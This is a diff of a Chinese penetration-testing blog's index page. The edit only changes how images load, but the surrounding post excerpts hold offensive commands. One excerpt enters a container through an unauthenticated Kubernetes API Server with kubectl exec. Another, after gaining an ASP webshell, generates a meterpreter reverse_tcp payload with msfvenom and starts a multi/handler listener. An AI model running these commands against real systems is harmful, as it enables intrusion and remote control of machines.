@@ -250,7 +250,7 @@
 
       
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img data-src="SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
 <p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
           <!--noindex-->
             <div class="post-button">
@@ -336,7 +336,7 @@
 <h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a target="_blank" rel="noopener" href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
 <h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
+<p><img data-src="Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
 
       
@@ -576,7 +576,7 @@
       
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img data-src="%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/#more" rel="contents">
@@ -659,7 +659,7 @@
       
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
-<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
+<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img data-src="%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/#more" rel="contents">
@@ -742,7 +742,7 @@
       
           <p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
-<p>执行后等待进度条结束即可：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
+<p>执行后等待进度条结束即可：<br><img data-src="VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/#more" rel="contents">
@@ -824,7 +824,7 @@
 
       
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
-<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
+<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
 <h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
 
 <h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
